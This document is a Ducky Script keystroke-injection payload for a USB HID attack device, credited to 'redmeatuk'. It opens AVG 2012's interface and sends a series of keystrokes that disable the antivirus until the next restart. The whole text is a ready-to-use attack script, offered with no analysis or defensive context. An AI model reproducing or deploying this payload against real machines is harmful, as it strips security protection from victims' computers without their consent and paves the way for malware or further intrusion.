Original version by redmeatuk. 

```
DEFAULT_DELAY 400
REM this payload disables AVG 2012 until next restart assumes that UAC has not been used recently
REM Encoder 2.4
DELAY 3000
GUI r
STRING C:\Program Files (x86)\AVG\AVG2012\avgui
ENTER
DELAY 1000
ALT t
DOWN
REPEAT 4
ENTER
DOWN
DOWN
TAB
REPEAT 3
SPACE
TAB
REPEAT 2
ENTER
TAB
DOWN
DOWN
ENTER
ALT y
ALT F4
```